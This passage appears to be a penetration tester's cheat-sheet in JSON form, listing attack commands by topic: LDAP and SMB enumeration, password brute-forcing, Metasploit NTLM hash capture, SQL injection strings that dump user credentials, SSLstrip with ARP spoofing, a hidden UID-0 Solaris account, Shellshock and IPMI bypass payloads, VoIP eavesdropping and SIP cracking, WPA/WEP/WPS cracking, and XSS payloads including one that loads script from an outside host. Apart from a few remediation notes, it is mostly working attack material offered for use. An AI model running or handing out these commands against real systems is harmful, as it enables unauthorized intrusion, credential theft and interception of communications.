'\\x00\\x0a\\x0d'\n\n"], ["PenTesting", "File Transfer Services", "\n- Start TFTPD Server\natftpd --daemon --port 69 /tmp\n\n- Connect to TFTP Server\ntftp 192.168.0.10\nput / get files\n\n"], ["PenTesting", "LDAP Querying", "\nTools:\nldapsearch\nLDAPExplorertool2\n\nAnonymous Bind:\nldapsearch -h ldaphostname -p 389 -x -b \"dc=domain,dc=com\"\n\nAuthenticated:\nldapsearch -h 192.168.0.60 -p 389 -x -D \"CN=Administrator, CN=User, DC=<domain>, DC=com\" -b \"DC=<domain>, DC=com\" -W\n\nUseful Links:\nhttp://www.lanmaster53.com/2013/05/public-facing-ldap-enumeration/\nhttp://blogs.splunk.com/2009/07/30/ldapsearch-is-your-friend/\n\n\n"], ["PenTesting", "Password Attacks", "\n- Bruteforcing http password prompts\nmedusa -h <ip/host> -u <user> -P <password list> -M http -n <port> -m DIR:/<directory> -T 30\n"], ["Pyinstaller", "Python reverse shell", "python.exe c:\\Python27\\PyInstaller-2.1\\pyinstaller.py --noconsole --onefile c:\\Python27\\PyInstaller-2.1\\ReverseShell.py\n\n"], ["Pyinstaller", "Generate the .spec file.", "-\n\n"], ["Pyinstaller", "Windows: (You want a single EXE file with your data in it, hence --onefile).", "python pyinstaller.py --onefile your_main_file.py\n\n"], ["Pyinstaller", "Rebuild your package.", "python pyinstaller.py your_main_file.spec\n\n"], ["Pyinstaller", "Look for your .exe or your .app bundle in the dist directory.", "-"], ["Remediations", "Weak SSH Ciphers", "\nsudo nano /etc/ssh/sshd_config\n\nAdd the following lines:\n\nCiphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,arcfour\nMACs hmac-sha1,hmac-ripemd160\n\nRestart SSH\n\n"], ["Remediations", "Unquoted Service Paths", "Run Regedit and browse to HKLM\\SYSTEM\\CurrentControlSet\\services\nFind the service in question and simply add \" \" either side of the ImagePath string.\n\nCheck permissions:\nC:\\Users\\user>icacls \"C:\\Program Files (x86)\\Vuln\\Vuln Software 7.0\\software.exe\""], ["scp", "Copy remote file to local host:", "$ scp your_username@192.168.0.10:<remote_file> /some/local/directory\n\n"], ["scp", "Copy local file to remote host:", "$ scp <local_file> your_username@192.168.0.10:/some/remote/directory\n\n"], ["scp", "Copy local directory to remote directory:", "scp -r <local_dir> your_username@192.168.0.10:/some/remote/directory/<remote_dir>\n\n"], ["scp", "Copy a file from one remote host to another:", "scp your_username@<host1>:/some/remote/directory/foobar.txt your_username@<host2>:/some/remote/directory/\n\n"], ["scp", "Improve scp performance (use blowfish):", "scp -c blowfish <local_file> your_username@192.168.0.10:/some/remote/directory"], ["SMBCapture", "NBNS Spoof", "msf > use auxiliary/spoof/nbns/nbns_response\nmsf auxiliary(nbns_response) > show options\nmsf auxiliary(nbns_response) > set INTERFACE eth0\nmsf auxiliary(nbns_response) > set SPOOFIP 10.10.10.10\nmsf auxiliary(nbns_response) > run\n\n"], ["SMBCapture", "SMB Capture", "msf > use auxiliary/server/capture/smb\nmsf auxiliary(smb) > set JOHNPWFILE /tmp/john_smb\nmsf auxiliary(smb) > run\n\n"], ["SMBCapture", "HTTP NTML Capture", "msf auxiliary(smb) > use auxiliary/server/capture/http_ntlm\nmsf auxiliary(smb) > set JOHNPWFILE /tmp/john_http\nmsf auxiliary(smb) > set SRVPORT 80\nmsf auxiliary(smb) > set URIPATH /\nmsf auxiliary(smb) > run\n\n\n"], ["SMBCapture", "Fix", "http://www.leonteale.co.uk/netbios-nbns-spoofing/\n\nSolution\nThe solution to this is to disable Netbios from broadcasting. The setting for this is in, what i hope, a very familiar place thaet you might not have really paid attention too before.\nnetbios\n \nNetbios, according to Microsoft, is no longer needed as of Windows 2000.\nHowever, there are a few side effects.\nOne of the unexpected consequences of disabling Netbios completely on your network is how this affects trusts between forests. Windows 2000 let you create an external (non-transitive) trust between a domain in one forest and a domain in a different forest so users in one forest could access resources in the trusting domain of the other forest. Windows Server 2003 takes this a step further by allowing you to create a new type of two-way transitive trusts called forest trusts that allow users in any domain of one forest access resources in any domain of the other forest. Amazingly, NetBIOS is actually still used in the trust creation process, even though Microsoft has officially \"deprecated\" NetBIOS in versions of Windows from 2000 on. So if you disable Netbios on your domain controllers, you won\u00e2\u20ac\u2122t be able to establish a forest trust between two Windows Server 2003 forests.\nBut Windows 2003 is pretty old, since as of writing we are generally on Windows 2012 now. So if you would like to disable Netbios on your servers yet will be effected by the side effect for Forest trusts then ideally you should upgrade and keep up with the times anyway. alternatively, you can get away with, at the very least, disabling Netbios on your workstations.\nSee below for step by step instructions on disabling Netbios on workstations:\n\nWindows XP, Windows Server 2003, and Windows 2000\nOn the desktop, right-click My Network Places, and then click Properties.\nRight-click Local Area Connection, and then click Properties\nIn the Components checked are used by this connection list, double-click Internet Protocol (TCP/IP), clickAdvanced, and then click the WINS tab.Note In Windows XP and in Windows Server 2003, you must double-click Internet Protocol (TCP/IP) in the This connection uses the following items list.\nClick Use NetBIOS setting from the DHCP server, and then click OK three times.\n\nFor Windows Vista\nOn the desktop, right-click Network, and then click Properties.\nUnder Tasks, click Manage network connections.\nRight-click Local Area Connection, and then click Properties\nIn the This connection uses the following items list, double-click Internet Protocol Version 4 (TCP/IPv4), clickAdvanced, and then click the WINS tab.\nClick Use NetBIOS setting from the DHCP server, and then click OK three times.\n\nFor Windows 7\nClick Start, and then click Control Panel.\nUnder Network and Internet, click View network status and tasks.\nClick Change adapter settings.\nRight-click Local Area Connection, and then click Properties.\nIn the This connection uses the following items list, double-click Internet Protocol Version 4 (TCP/IPv4), clickAdvanced, and then click the WINS tab.\nClick Use NetBIOS setting from the DHCP server, and then click OK three times."], ["SMBEnumeration", "SMB Enumeration Techniques using Backtrack:", "1. NBTSCAN\n\nroot@bt:~# nbtscan -r 10.0.2.0/24\nDoing NBT name scan for addresses from 10.0.2.0/24\n\nIP address       NetBIOS Name     Server    User             MAC address      \n------------------------------------------------------------------------------\n10.0.2.0\tSendto failed: Permission denied\n10.0.2.10        <unknown>                  <unknown>        \n10.0.2.15        METASPLOITABLE   <server>  METASPLOITABLE   00-00-00-00-00-00\n10.0.2.18        TEST01\t\t  <server>  TEST01\t     00-11-21-22-1d-4d\n10.0.2.45        TEST04\t \t  <server>  TEST04           00-12-d2-34-11-55\n\n2. NMAP\n\nnmap -p 1-65535 -T4 -O -A -v 10.0.2.15\n\n3. SMBCLIENT\n\nroot@bt:~# smbclient -L=10.0.2.15\n\n"], ["SMBEnumeration", "Null Sessions", "root@bt:~# smbclient \\\\\\\\10.0.2.15\\\\tmp\nEnter root's password: \nAnonymous login successful\n\n"], ["SMBEnumeration", "SMB Enumeration Techniques using Windows Tools:", "\n1. NetBIOS Enumerator (nbtenum)\n\nhttp://nbtenum.sourceforge.net/"], ["SMTPOpenRelay", "SMTP Open Relay Commands", "[-] ncat -C 86.54.23.178 25\n[-] HELO mail.co.uk\n[-] MAIL FROM: <user@mail.co.uk>\n[-] RCPT TO: <test@email.com>\n[-] DATA\nTest Email"], ["Solaris", "Solaris vulnerabilities:", "Solaris 7:\nsadmind_exec            SADMIND -   weakness in default security settings  - allows root - rootdown.pl\n**ttyprompt               TELNET -    buffer overflow in solaris login - manual through telnet client\nsendmail_exec           LPD -       line printer daemon buffer overflow  - allows root\nheap_noir               DTSPCD -    CDE common desktop environment heap overflow  TCP port 6112, runs with root\nypupdated_exec          YPUPDATED - weakness in handling of the command shell - allows root\nkcms_readfile         kcms / ttdbserverd remote file read (only in msf2)\n\nSolaris 8:              \nsadmind_exec            SADMIND -   weakness in default security settings  - allows root - rootdown.pl\n**ttyprompt               TELNET -    buffer overflow in solaris login - manual through telnet client\nsendmail_exec           LPD -       line printer daemon buffer overflow  - allows root\nheap_noir               DTSPCD -    CDE common desktop environment heap overflow  TCP port 6112, runs with root\nypupdated_exec          YPUPDATED - weakness in handling of the command shell - allows root.\nno exploit - sadmind_adm_build_path  SADMIND  -  stack buffer overflow in adm_build_path() function.\nkcms_readfile         kcms / ttdbserverd remote file read (only in msf2)\n\nsolaris 9:\nsadmind_exec            SADMIND -   weakness in default security settings  - allows root - rootdown.pl\nypupdated_exec          YPUPDATED - weakness in handling of the command shell - allows root.\nsadmind_adm_build_path  SADMIND  -  stack buffer overflow in adm_build_path() function.\nkcms_readfile         kcms / ttdbserverd remote file read (only in msf2)\n\nSolaris 10:\nfuser                   TELNET - authentication bypass through -f command - can be manually exploited\nypupdated_exec          YPUPDATED - weakness in handling of the command shell - allows root.\n\nSolaris 11:\nfuser                   TELNET - authentication bypass through -f command - can be manually exploited \n\n"], ["Solaris", "Adding solaris user:", "useradd -u 0 -o pentestuser \npasswd -d pentestuser\n\n"], ["Solaris", "In addition, familiarise yourself with rpcinfo, nfsshell, showmount, 'mount -t nfs'.", "-"], ["SQLInjection", "Union Based SQL Injection", "' or 1=1#\n\n1' ORDER BY 10#\n\n1' UNION SELECT version(),2#\n\n1' UNION SELECT version(),database()#\n\n1' UNION SELECT version(),user()#\n\n1' UNION ALL SELECT table_name,2 from information_schema.tables#\n\n1' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = \"users\"#\n\n1' UNION ALL SELECT concat(user,char(58),password),2 from users#\n\n"], ["SQLInjection", "sqlmap", "sqlmap --url=\"<url>\" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs"], ["SSLStrip", "SSL Strip", "1) Flip your machine into forwarding mode (as root):\necho \"1\" > /proc/sys/net/ipv4/ip_forward\n\n2) Setup iptables to intercept HTTP requests (as root):\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n\t\n3) sslstip.py -l 8080 -f lock.ico\n\n4) Run arpspoof to redirect traffic to your machine (as root):\narpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>"], ["Tools", "Browser Addons", "- Chrome:\n\nRecx Security Analyser\nWappalyzer\n\n- Firefox/Iceweasel:\n\nWeb Developer\nTamper Data\nFoxyProxy Standard\nUser Agent Switcher\nPassiveRecon\nWappalyzer\nFirebug\nHackBar"], ["UsefulCommands", "Remove text using sed", "cat SSL_Hosts.txt | sed -r 's/\\ttcp\\t/:/g'\n\n"], ["UsefulCommands", "Port forwarding using NCAT", "ncat -lvkp 12345 -c \"ncat --ssl 192.168.0.1 443\"\n\n"], ["UsefulCommands", "Windows 7 or later, build port relay", "C:\\> netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>\n\n"], ["UsefulCommands", "Grab HTTP Headers", "curl -LIN <host>\n\n"], ["UsefulCommands", "Quickly generate an MD5 hash for a text string using OpenSSL", "echo -n 'text to be encrypted' | openssl md5\n\n"], ["UsefulCommands", "Shutdown a Windows machine from Linux", "net rpc shutdown -I ipAddressOfWindowsPC -U username%password\n\n"], ["UsefulCommands", "Conficker Detection with NMAP", "nmap -PN -d -p445 --script=smb-check-vulns --script-args=safe=1 IP-RANGES\n\n"], ["UsefulCommands", "Determine if a port is open with bash", "(: </dev/tcp/127.0.0.1/80) &>/dev/null && echo \"OPEN\" || echo \"CLOSED\""], ["Vlans", "Configure an Ethernet interface as a VLAN trunk", "Suppose that a host requires access to two VLANs, both carried by a trunk connected to physical interface eth0. The assigned IP addresses for the host are 192.168.2.1/24 on VLAN 2 and 192.168.3.1/24 on VLAN 3.\n\n1 First install the vlan package if it is not already present:\n\napt-get install vlan\n\n2 Turn off network-manager\n\nsudo stop network-manager\n\n3 Configuring interfaces\n\nvconfig add eth0 <VLAN ID> (you may get a warning message on the first one)\nexample: vconfig add eth0 101\n\nifconfig eth0.<VLAN ID> <IP Address>/24 up\nexample: ifconfig eth0.101 192.168.1.10/24 up\n\nifconfig eth0.<VLAN ID>\n\nNote: If any issues run, ifconfig eth0 0.0.0.0 up\nNote: Specify interface with nmap scanning (nmap -e eth0.101)\nNote: You will probably need to add individual routes for each vlan if you want to communicate between vlans, don't rely on your default gateway. (route add)\n\n4 Remove Configuration\nvconfig rem eth0.101\n"], ["VOIP", "Voip (SID)", "SIP usually uses ports 5060 TCP or UDP for unencrypted signaling or 5061 for encrypted transportation using TLS.\n\nSIP is an ASCII based protocol which has some similar elements like in the HTTP protocol by using a Request/Response model. Much like an HTTP request from a browser a SIP client request is made using a SIP URI a user agent and a method/request. SIP uses e-mail like addresses format: user/phone@domain/ip A typical SIP URI looks like:\n\nsip:205@192.168.1.100, sip:username@pbx.com , sip:205@192.168.1.100:5060\n\n\n"], ["VOIP", "SIP Requests / Methods", "Request\t\tDescription\nINVITE\t\tUsed to invite and account to participate in a call session.\nACK\t\t\tAcknowledge an INVITE request.\nCANCEL\t\tCancel a pending request.\nREGISTER\tRegister user with a SIP server.\nOPTIONS\t\tLists information about the capabilities of a caller.\nBYE\t\t\tTerminates a session between two users in a call.\nREFER\t\tIndicates that the recipient(identified by the Request URI) should contact a third party using the contact information provided in the request.\nSUBSCRIBE\tThe SUBSCRIBE method is used to request current state and state updates from a remote node.\nNOTIFY\t\tThe NOTIFY method is used to notify a SIP node that an event which has been requested by an earlier SUBSCRIBE method has occurred.\n\n\n"], ["VOIP", "An Example SIP \"INVITE\" Request:", "INVITE sip:201@192.168.1.104 SIP/2.0\nVia: SIP/2.0/UDP 192.168.1.102;rport;branch=z9hG4bKvbxaoqar\nMax-Forwards: 70 \n\nTo: \nFrom: \"NightRanger\" ;tag=eihgg\nCall-ID: hfxsabthoymshub@backtrack\nCSeq: 649 INVITE\nContact: \nContent-Type: application/sdp \n\nAllow: INVITE,ACK,BYE,CANCEL,OPTIONS,PRACK,REFER,NOTIFY,SUBSCRIBE,INFO,MESSAGE\nSupported: replaces,norefersub,100rel\nUser-Agent: Twinkle/1.2 \n\nContent-Length: 310\n\n\n"], ["VOIP", "SIP Responses", "Response\tDescription\n1xx\t\t\tInformational responses, Request received and being\n2xx\t\t\tSuccessful responses The action was successfully received, understood, and accepted.\n3xx\t\t\tRedirection responses\n4xx\t\t\tRequest failure responses The request contains bad syntax or cannot be fulfilled at the server.\n5xx\t\t\tServer failure responses The server failed to fulfill an apparently valid request.\n6xx\t\t\tGlobal failure responses The request cannot be fulfilled at any\tserver.\n\n\n"], ["VOIP", "SIP Call Between 2 Phones Example", "The calling phone sends an invite.\nThe called phone sends back a response of 100 (Trying).\nThe called phone then starts to ring and sends a response of 180 (Ringing).\nWhen the caller picks up the phone the called phone sends a response of 200 (OK).\nThe calling phone sends an ACK response.\nConversation begins via RTP.\nWhen the caller hangs up the phone a BYE request is sent.\nThe calling phone responds with 200 (OK).\n\n"], ["VOIP", "SMAP - Simple scanner for SIP enabled devices.", "./smap 192.168.1.104\n./smap 192.168.1.130/24\n./smap -O 192.168.1.104\n./smap -l 192.168.1.104\n./smap -d 192.168.1.104\n\n"], ["VOIP", "SIPSAK - Testing SIP enabled applications and devices using the OPTION request method only.", "sipsak -vv -s sip:192.168.1.221\n\n"], ["VOIP", "SIPScan - Simple scanner for sip enabled hosts.", "./sip-scan -i eth0 192.168.1.1-254\n\n"], ["VOIP", "SVMAP (SIPVicious)", "./svmap.py 192.168.1.1-254\n./svmap.py 192.168.1.1-254 --fp\n\n"], ["VOIP", "Svwar - Enumerate extensions by using a range of extensions or using a dictionary file.", "./svwar.py -e100-400 192.168.1.104\n./svwar.py -e100-400 192.168.1.104 -m INVITE -v\n\n"], ["VOIP", "Enumiax - Enumerate Asterisk Exchange protocol usernames.", "./enumiax -v -m3 -M3 192.168.1.104\n./enumiax -d dict -v 192.168.1.104\n\n\n"], ["VOIP", "Monitoring Traffic and Eavesdropping Phone calls", "Capturing SIP authentication (we will later discuss this topic in the attacking authentication section).\nEavesdropping users phone calls.\n\n"], ["VOIP", "Arp Poisoning using Arpspoof", "echo 1 > /proc/sys/net/ipv4/ip_forward\narpspoof \u00e2\u20ac\u201ct victim gateway\narpspoof \u00e2\u20ac\u201ct gateway victim\n\nCapturing traffic and Eavesdropping using Wireshark\n\nCapture Filter: not broadcast and not multicast and host <IP ADDRESS>\n\nWireshark: Decode captured VoIP calls data into playable audio format. This feature is under the Statistics -> VoIP Calls menu.\n\n\n"], ["VOIP", "Capturing SIP Authentication using SIPDump", "SIPDump is a part of the SIPCrack tools suite, it allows performing a live capture of SIP authentication digest response or it can dump a previously captured sessions from a PCAP file.\n\n./sipdump -i eth0\n./sipdump -i eth0 auth.txt\n./sipdump -p /root/registration.pcap auth.txt\n\n\n"], ["VOIP", "Cracking SIP Digest response hashes", "\n./sipcrack -w sipass.txt auth.txt\n\n\n"], ["VOIP", "Brute forcing SIP Accounts", "\n./svcrack.py -u200 -d wordlist.txt 192.168.1.104\n./svcrack.py -u200 -r100000-999999 192.168.1.104\n\n\n"], ["VOIP", "VLAN Hopping", "modprobe 8021q\n\n"], ["VOIP", "VoIP Hopper", "./voiphopper -i eth0 -c 0\n./voiphopper -i eth0 -v 20\n\n\n"], ["VOIP", "Inviteflood - This tool can be used to flood a target with INVITE requests it can be used to target sip gateways/proxies and sip phones.", "\n./inviteflood eth0 <target_extension> <target_domain> <target_ip number_of_packets>\n\n\n"], ["VOIP", "Scanning SIP Enabled Devices", "use auxiliary/scanner/sip/options\n\n"], ["VOIP", "Enumerating SIP extensions / Usernames", "use scanner/sip/enumerator\nset RHOSTS 192.168.1.104\nset MINEXT 100\nset MAXEXT 500\nset PADLEN 3\n\n"], ["VOIP", "Spoofing Caller ID auxiliary", "use voip/sip_invite_spoof"], ["VulnVerify", "IPMI Cipher Suite Zero Authentication Bypass:", "http://www.tenable.com/plugins/index.php?view=single&id=68931\n\nTools required:\nipmitool\nfreeipmi-tools\n\nipmitool -I lanplus -H 192.168.0.1 -U Administrator -P notapassword user list\n\n# Specifying Cipher Suite Zero\nipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword user list\nipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword chassis status\nipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword help\nipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword shell\nipmitool -I lanplus -C 0 -H 192.168.0.1 -U Administrator -P notapassword sensor\n\n\n"], ["VulnVerify", "Bash Remote Code Execution (Shellshock)", "http://www.tenable.com/plugins/index.php?view=single&id=77823\n\nx: () { :;}; /sbin/ifconfig > /tmp/ifconfig.txt\nx: () { :;}; echo \"Hacked\" > /var/www/hacked.html\n\n\n"], ["VulnVerify", "DNS Server Cache Snooping Remote Information Disclosure", "http://www.tenable.com/plugins/index.php?view=single&id=12217\n\nNmap Script: dns-cache-snoop\nhttp://nmap.org/nsedoc/scripts/dns-cache-snoop.html\n\nnmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={host1,host2,host3}' <target>\n\n\n"], ["VulnVerify", "IP Forwarding Enabled", "http://www.tenable.com/plugins/index.php?view=single&id=50686\n\nNmap Script: ip-forwarding\nhttp://nmap.org/nsedoc/scripts/ip-forwarding.html\n\nsudo nmap -sn <target> --script ip-forwarding --script-args='target=www.example.com'\n\n"], ["VulnVerify", "Alternatives", "- Set VM's default gateway as the victim IP address and attempt to route elsewhere.\n- http://pentestmonkey.net/tools/gateway-finder\n"], ["WirelessTesting", "", ""], ["WirelessTesting", "WPA PSK attack with aircrack-ng suite.", "\nPlace your wireless card into Monitor Mode\nairmon-ng start wlan0\n\nDetect all available wireless AP\u00e2\u20ac\u2122s and clients\nairodump-ng mon0\n\nSetting adapter channel\niwconfig mon0 channel <channel_number>\n\nCapturing the four-way handshake\nairodump-ng --channel <channel_number> --bssid <bssid> --write capture mon0\n\nYou can capture the handshake passively (it takes time) or de-authenticate a client.\n\nDe-authentication attack\naireplay-ng --deauth 3 -a <BSSID> -c <client_mac> mon0\n\nDeauth every client - aireplay-ng -0 5 -a <bssid> mon0\n\nDictionary Attack\naircrack-ng -w passwords.lst capture-01.cap\n\nBrute force Attack\ncrunch 8 8 0123456789 | aircrack-ng -e \"Name of Wireless Network\" -w - /root/home/wpa2.eapol.cap\n\n\n"], ["WirelessTesting", "WEP attack with aircrack-ng suit", "\nPlace your wireless card into Monitor Mode\nairmon-ng start wlan0\n\nDetect all available wireless AP\u00e2\u20ac\u2122s and clients\nairodump-ng mon0\n\nSetting adapter channel\niwconfig mon0 channel <channel_number>\n\nairodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)\n\naireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)\n\naireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)\n\naircrack-ng -b (bssid) (file name-01.cap)\n\n\n"], ["WirelessTesting", "Rogue Access Point Testing", "# ifconfig wlan0 down\n# iw reg set BO\n# iwconfig wlan0 txpower 0\n# ifconfig wlan0 up\n# airmon-ng start wlan0\n# airodump-ng --write capture mon0\n\nroot@backbox:/home/backbox# ifconfig wlan1 down\nroot@backbox:/home/backbox# iw reg set BO\nroot@backbox:/home/backbox# ifconfig wlan1 up\nroot@backbox:/home/backbox# iwconfig wlan1 channel 13\nroot@backbox:/home/backbox# iwconfig wlan1 txpower 30\nroot@backbox:/home/backbox# iwconfig wlan1 rate 11M auto\n\n\n"], ["WirelessTesting", "Reaver", "airmon-ng start wlan0\nairodump-ng wlan0\nreaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv\nreaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1\n\n\n"], ["WirelessTesting", "Pixie WPS", "airmon-ng check\nairmon-ng start wlan0\nairodump-ng wlan0mon --wps\nreaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1\n\n\n"], ["WirelessTesting", "Wireless Notes", "Wired Equivalent Privacy (WEP)\nRC4 stream cipher w/ CRC32 for integrity check\n- Attack: \nBy sniffing an ARP packet, then replaying it to get many encrypted replies with different IVs.\n- Remediation: \nUse WPA2\n\nWifi Protected Access (WPA)\nTemporal Key Integrity Protocol (TKIP) Message Integrity Check\n- Attack: \nUses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.\n- Remediation: \nUse long-keys\n\nWifi Protected Access 2 (WPA2)\nAdvanced Encryption Standard (AES)\n- Attack: \nUses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.\n- Remediation:\nWPA-Enterprise\n"], ["XSS", "XSS Notes", "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>\n\n<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\n<IMG SRC=\"javascript:alert('XSS');\">\n\n<a onmouseover=\"alert(document.cookie)\">xxs link</a>\n<a onmouseover=alert(document.cookie)>xxs link</a> \n"]]